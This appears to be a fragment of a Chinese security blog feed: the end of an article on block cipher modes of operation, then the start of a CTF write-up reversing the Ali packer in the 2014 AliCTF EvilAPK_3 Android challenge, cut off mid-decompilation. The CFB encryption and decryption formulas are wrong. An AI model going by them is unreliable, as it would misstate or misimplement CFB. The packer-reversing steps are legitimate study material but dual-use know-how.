title="填充密码块链接（PCBC）"></a>填充密码块链接（PCBC）</h2><p>填充密码块链接（PCBC，Propagating cipher-block chaining）或称为明文密码块链接（Plaintext cipher-block chaining），是一种可以使密文中的微小更改在解密时导致明文大部分错误的模式，并在加密的时候也具有同样的特性。</p><p><img src="/pics/分组密码的工作模式/5.png" alt="PCBC模式加密"></p><p><img src="/pics/分组密码的工作模式/6.png" alt="PCBC模式解密"></p><p>PCBC 的加密过程如下：</p><p>$$<br>C_i = E_K(P_i \oplus IV) \\<br>IV = P_i \oplus C_i<br>$$</p><p>其解密过程如下：</p><p>$$<br>P_i = D_K(C_i) \oplus IV \\<br>IV = P_i \oplus C_i<br>$$</p><p>PCBC 主要用于 Kerberos v4 和 WASTE 中，而在其它场合的应用较少。对于使用 PCBC 加密的消息，互换两个邻接的密文块不会对后续块的解密造成影响。正因为这个特性，Kerberos v5 没有使用 PCBC。</p><h2 id="密文反馈（CFB）"><a href="#密文反馈（CFB）" class="headerlink" title="密文反馈（CFB）"></a>密文反馈（CFB）</h2><p>密文反馈（CFB，Cipher feedback）模式类似于 CBC，可以将块密码变为自同步的流密码；工作过程亦非常相似，CFB 的解密过程几乎就是颠倒的 CBC 的加密过程：</p><p>$$<br>C_i = E_K(IV \oplus P_i) \\<br>P_i = E_K(IV \oplus C_i) \\<br>IV = C_i<br>$$</p><p><img src="/pics/分组密码的工作模式/7.png" alt="CFB模式加密"></p><p><img src="/pics/分组密码的工作模式/8.png" alt="CFB模式解密"></p><p>上述公式是描述的是最简单的 CFB，在这种模式下，它的自同步特性仅仅与 CBC 相同，即若密文的一整块发生错误，CBC 和 CFB 都仍能解密大部分数据，而仅有一位数据错误。若需要在仅有了一位或一字节错误的情况下也让模式具有自同步性，必须每次只加密一位或一字节。可以将移位寄存器作为块密码的输入，以利用 CFB 的自同步性。</p><p>为了利用 CFB 制作一种自同步的，可以处理任意位情况错误的流密码，需要使用一个与块的大小相同的移位寄存器，并用 IV 将寄存器初始化。然后，将寄存器内容使用块密码加密，然后将结果的最高 $x$ 位与明文的 $x$ 进行异或，以产生密文的 $x$ 位。下一步将生成的 $x$ 位密文移入寄存器中，并对下面的 $x$ 位明文重复这一过程。解密过程与加密过程相似，以 IV 开始，对寄存器加密，将结果的高 $x$ 与密文异或，产生 $x$ 位明文，再将密文的下面 $x$ 位移入寄存器。</p><p>下式中 $S_i$ 是移位寄存器的第 $i$ 个状态，$a \ll x$ 是指将 $a$ 移位 $x$ 位，$head(a, x)$ 是指 $a$ 的高 $x$ 位，$n$ 则是指 IV 的位数。</p><p>$$<br>C_i = head(E_K(S_{i-1}), x) \oplus P_i \\<br>P_i = head(E_K(S_{i-1}), x) \oplus C_i \\<br>S_i = ((S_{i-1} \ll x) + C_i) mod\ 2^n \\<br>IV = S_i<br>$$</p><p>若密文的 $x$ 位发生错误，则密码在移位寄存器恢复与加密时的状态相同之前，输出不正确的结果，而当寄存器状态恢复后，密码即可以重新同步，恢复正常输出，因此最多只有一块数据发生错误。</p><p>与 CBC 相似，明文的改变会影响接下来所有的密文，因此加密过程不能并行化；而同样的，与 CBC 类似，解密过程是可以并行化的。在解密时，密文中一位数据的改变仅会影响两个明文块：对应明文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。</p><p>CFB 拥有一些 CBC 所不具备的特性，这些特性与 OFB 和 CTR 的流模式相似：只需要使用块密码进行加密操作，且消息无需进行填充（虽然密文窃取也允许数据不进行填充）。</p><h2 id="输出反馈（OFB）"><a href="#输出反馈（OFB）" class="headerlink" title="输出反馈（OFB）"></a>输出反馈（OFB）</h2><p>输出反馈模式（Output feedback, OFB）可以将块密码变成同步的流密码。它产生密钥流的块，然后将其与明文块进行异或，得到密文。与其它流密码一样，密文中一个位的翻转会使明文中同样位置的位也产生翻转。这种特性使得许多错误校正码，例如奇偶校验位，即使在加密前计算，而在加密后进行校验也可以得出正确结果。</p><p>由于 XOR 操作的对称性，加密和解密操作是完全相同的：</p><p>$$<br>C_i = P_i \oplus O_i \\<br>P_i = C_i \oplus O_i \\<br>O_i = E_K(O_{i-1}) \\<br>IV = O_i<br>$$</p><p><img src="/pics/分组密码的工作模式/9.png" alt="OFB模式加密"></p><p><img src="/pics/分组密码的工作模式/10.png" alt="OFB模式解密"></p><p>每个使用 OFB 的输出块与其前面所有的输出块相关，因此不能并行化处理。然而，由于明文和密文只在最终的异或过程中使用，因此可以事先对 IV 进行加密，最后并行的将明文或密文进行并行的异或处理。</p><p>可以利用输入全 0 的 CBC 模式产生 OFB 模式的密钥流。这种方法十分实用，因为可以利用快速的 CBC 硬件实现来加速 OFB 模式的加密过程。</p><h2 id="计数器模式（CTR）"><a href="#计数器模式（CTR）" class="headerlink" title="计数器模式（CTR）"></a>计数器模式（CTR）</h2><p>PS：CTR 模式（Counter mode，CM）也被称为 ICM 模式（Integer Counter Mode，整数计数模式）和 SIC 模式（Segmented Integer Counter）。</p><p>与 OFB 相似，CTR 将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。使用简单的、定义好的输入函数是有争议的：批评者认为它“有意的将密码系统暴露在已知的、系统的输入会造成不必要的风险”。目前，CTR 已经被广泛的使用了，由输入函数造成的问题被认为是使用的块密码的缺陷，而非 CTR 模式本身的弱点。无论如何，有一些特别的攻击方法，例如基于使用简单计数器作为输入的硬件差错攻击。</p><p>CTR 模式的特征类似于 OFB，但它允许在解密时进行随机存取。由于加密和解密过程均可以进行并行处理，CTR 适合运用于多处理器的硬件上。</p><p>注意图中的“nonce”与其它图中的 IV（初始化向量）相同。IV、随机数和计数器均可以通过连接，相加或异或使得相同明文产生不同的密文。</p><p><img src="/pics/分组密码的工作模式/11.png" alt="CTR模式加密"></p><p><img src="/pics/分组密码的工作模式/12.png" alt="CTR模式解密"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习一下密码学。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="crypto" scheme="blog.b3ale.cn/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2014-AliCTF-EvilAPK_3</title>
    <link href="blog.b3ale.cn/2020/02/15/2014-AliCTF-EvilAPK_3/"/>
    <id>blog.b3ale.cn/2020/02/15/2014-AliCTF-EvilAPK_3/</id>
    <published>2020-02-15T11:41:35.000Z</published>
    <updated>2020-02-19T02:44:54.523Z</updated>
    
    <content type="html"><![CDATA[<p>接触了一段时间的安卓后复现一下经典的题目，具体审计还有分析的步骤不做记录。</p><a id="more"></a><h1 id="Analysis（classes-dex）"><a href="#Analysis（classes-dex）" class="headerlink" title="Analysis（classes.dex）"></a>Analysis（classes.dex）</h1><p>这道题目是阿里 14 年出的，先导入 jadx 看看反编译后大概的内容。在 AndroidManifest.xml 中，可以看到先设置了入口点为 com.ali.mobisecenhance.StubApplication，猜测这里可能是阿里加固自己添加的一个入口，用来执行一些初始化的操作，比如解密 dex，反调试，检测模拟器等等之类的。调用完 StubApplication 后，才会调用 MainActivity：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">package</span>=<span class="string">"com.ali.tg.testapp"</span> <span class="attr">android:versionCode</span>=<span class="string">"1"</span> <span class="attr">android:versionName</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">"8"</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">"9"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:icon</span>=<span class="string">"@drawable/ic_launcher"</span> <span class="attr">android:name</span>=<span class="string">"com.ali.mobisecenhance.StubApplication"</span> <span class="attr">android:debuggable</span>=<span class="string">"true"</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".WebViewActivity"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在反编译出来的 Java 文件中，只能找到一个 StubApplication 类，其中的函数都是在 Native 层所实现，且加载了一个 mobisec 库。一般程序中是先执行 onCreate 函数，但 attachBaseContext 函数会早于 onCreate 函数执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ali.mobisecenhance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StubApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">(ClassLoader classLoader, Context context)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">attachBaseContext</span><span class="params">(Context context)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"mobisec"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在 lib 文件夹下看到 libmobisec.so 库，同时还可以看到在 assets 文件夹中有两个 jar 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">├── AndroidManifest.xml</span><br><span class="line">├── META-INF</span><br><span class="line">│   ├── MANIFEST.MF</span><br><span class="line">│   ├── TEST.RSA</span><br><span class="line">│   └── TEST.SF</span><br><span class="line">├── assets</span><br><span class="line">│   ├── cls.jar</span><br><span class="line">│   └── fak.jar</span><br><span class="line">├── classes.dex</span><br><span class="line">├── lib</span><br><span class="line">│   ├── armeabi</span><br><span class="line">│   │   ├── libhack.so</span><br><span class="line">│   │   ├── libmobisec.so</span><br><span class="line">│   │   └── libtranslate.so</span><br><span class="line">│   ├── armeabi-v7a</span><br><span class="line">│   │   ├── libhack.so</span><br><span class="line">│   │   ├── libmobisec.so</span><br><span class="line">│   │   └── libtranslate.so</span><br><span class="line">│   └── x86</span><br><span class="line">│       ├── libhack.so</span><br><span class="line">│       ├── libmobisec.so</span><br><span class="line">│       └── libtranslate.so</span><br><span class="line">├── res</span><br><span class="line">│   ├── drawable-hdpi</span><br><span class="line">│   │   ├── android.jpg</span><br><span class="line">│   │   └── android1.jpg</span><br><span class="line">│   ├── drawable-mdpi</span><br><span class="line">│   │   └── ic_launcher.png</span><br><span class="line">│   ├── drawable-xhdpi</span><br><span class="line">│   │   └── ic_launcher.png</span><br><span class="line">│   ├── drawable-xxhdpi</span><br><span class="line">│   │   └── ic_launcher.png</span><br><span class="line">│   └── layout</span><br><span class="line">│       ├── activity_main.xml</span><br><span class="line">│       └── webviewlayout.xml</span><br><span class="line">└── resources.arsc</span><br><span class="line"></span><br><span class="line">12 directories, 24 files</span><br></pre></td></tr></table></figure><p>file 一下，发现是 cls.jar 是一段不可识别的数据，fak.jar 判断出来是个 zip 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ file cls.jar</span><br><span class="line">cls.jar: data</span><br><span class="line"></span><br><span class="line">$ file fak.jar</span><br><span class="line">fak.jar: Zip archive data, at least v?[0x314] to extract</span><br></pre></td></tr></table></figure><p>经过以上粗略的审计，可以猜测可能是在 libmobisec.so 实现了 StubApplication 中的函数，并对 assets 文件夹下的两个文件进行操作来还原出 MainActivity 中的函数。</p><h1 id="Analysis（libmobisec-so）"><a href="#Analysis（libmobisec-so）" class="headerlink" title="Analysis（libmobisec.so）"></a>Analysis（libmobisec.so）</h1><p>打开 IDA，最先定位到 JNI_OnLoad 函数，查看一下注册了哪些函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">JNI_OnLoad</span><span class="params">(_JavaVM *vm, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// r2</span></span><br><span class="line">  jclass v3; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// zf</span></span><br><span class="line">  _JNIEnv *env; <span class="comment">// [sp+4h] [bp-Ch]</span></span><br><span class="line"></span><br><span class="line">  env = (_JNIEnv *)a2;</span><br><span class="line">  <span class="keyword">if</span> ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (<span class="keyword">void</span> **)&amp;env, <span class="number">65542</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="string">"Failed to get the environment"</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    _android_log_print(<span class="number">6</span>, <span class="string">"debug"</span>, v2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, <span class="string">"com/ali/mobisecenhance/StubApplication"</span>);<span class="comment">// locate class</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="string">"failed to get class reference"</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = env-&gt;functions-&gt;RegisterNatives(&amp;env-&gt;functions, v3, (<span class="keyword">const</span> JNINativeMethod *)gMethods, <span class="number">2</span>) == <span class="number">0</span>;<span class="comment">// register 2 methods</span></span><br><span class="line">  result = <span class="number">65542</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 RegisterNatives 函数的参数中可以看到注册了两个函数，分别为 attachBaseContext 和 onCreate。在内存中可以找到两个函数对应的指针：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.data:00054010 gMethods        DCD aAttachbasecont_0   ; DATA XREF: JNI_OnLoad+44↑o</span><br><span class="line">.data:00054010                                         ; .text:off_24784↑o</span><br><span class="line">.data:00054010                                         ; &quot;attachBaseContext&quot;</span><br><span class="line">.data:00054014                 DCD aLandroidConten_1   ; &quot;(Landroid/content/Context;)V&quot;</span><br><span class="line">.data:00054018                 DCD sub_24D3C+1</span><br><span class="line">.data:0005401C                 DCD aOncreate           ; &quot;onCreate&quot;</span><br><span class="line">.data:00054020                 DCD aV                  ; &quot;()V&quot;</span><br><span class="line">.data:00054024                 DCD sub_24498+1</span><br></pre></td></tr></table></figure><p>因为 attachBaseContext 先于 onCreate 函数执行，这里先看一下 attachBaseContext。跟着 log 可以对函数有一个大体的了解，在一处 log 里有“enter new application”的信息，猜测可能是完成了解码进入 MainActivity。在该处上下看看可以发现一个 parse_dex 函数，很有可能是解析出真正的 dex 文件的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">attachBaseContext</span><span class="params">(_JNIEnv *a1, jobject *a2, jobject *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  jobject *v3; <span class="comment">// r8</span></span><br><span class="line">  jobject *v4; <span class="comment">// r10</span></span><br><span class="line">  _JNIEnv *env; <span class="comment">// r4</span></span><br><span class="line">  _JNIEnv *v6; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  ali *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v19; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *v22; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *v23; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v24; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v25; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">size_t</span> v26; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v31; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// r0</span></span><br><span class="line">  ali *v33; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v35; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [sp+8h] [bp-78h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [sp+18h] [bp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [sp+24h] [bp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [sp+3Ch] [bp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> *v40; <span class="comment">// [sp+4Ch] [bp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> *v41; <span class="comment">// [sp+50h] [bp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  v4 = a3;</span><br><span class="line">  env = a1;</span><br><span class="line">  _android_log_print(<span class="number">6</span>, <span class="string">"debug"</span>, <span class="string">"in..."</span>);</span><br><span class="line">  result = ali::init_classes(env, v6, v7);      <span class="comment">// init classes</span></span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  v9 = (ali *)_JNIEnv::CallNonvirtualVoidMethod(env, v3, ali::ContextWrapper, dword_54128, v4);</span><br><span class="line">  v36 = ali::NanoTime(v9);</span><br><span class="line">  v10 = _JNIEnv::GetObjectClass(env, v3);</span><br><span class="line">  v11 = _JNIEnv::GetMethodID(env, v10, <span class="string">"getFilesDir"</span>, <span class="string">"()Ljava/io/File;"</span>);</span><br><span class="line">  v12 = _JNIEnv::CallObjectMethod(env, v3, v11);</span><br><span class="line">  v13 = v12;</span><br><span class="line">  v14 = _JNIEnv::GetObjectClass(env, v12);</span><br><span class="line">  v15 = _JNIEnv::GetMethodID(env, v14, <span class="string">"getAbsolutePath"</span>, <span class="string">"()Ljava/lang/String;"</span>);</span><br><span class="line">  v16 = _JNIEnv::CallObjectMethod(env, v13, v15);</span><br><span class="line">  sub_247D8(&amp;v39, env, v16);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v39 != (<span class="keyword">char</span> *)&amp;ali::g_filePath )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::_M_assign((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;ali::g_filePath, v41, v40);</span><br><span class="line">  <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v39);</span><br><span class="line">  _android_log_print(<span class="number">3</span>, <span class="string">"debug"</span>, <span class="string">"global files path is %s"</span>, dword_540E8);</span><br><span class="line">  v17 = _JNIEnv::CallObjectMethod(env, v3, dword_541A4);</span><br><span class="line">  <span class="keyword">if</span> ( ali::sdk_int &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = _JNIEnv::GetObjectField(env, v17, dword_5416C);</span><br><span class="line">    sub_247D8(&amp;v38, env, v20);</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>+&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v39, &amp;v38, <span class="string">"/lib"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( &amp;v39 != (<span class="keyword">char</span> *)&amp;ali::g_libPath )</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::_M_assign((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;ali::g_libPath, v41, v40);</span><br><span class="line">    <span class="built_in">std</span>::priv::_String_base&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_deallocate_block(&amp;v39);</span><br><span class="line">    v19 = &amp;v38;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v18 = _JNIEnv::GetObjectField(env, v17, 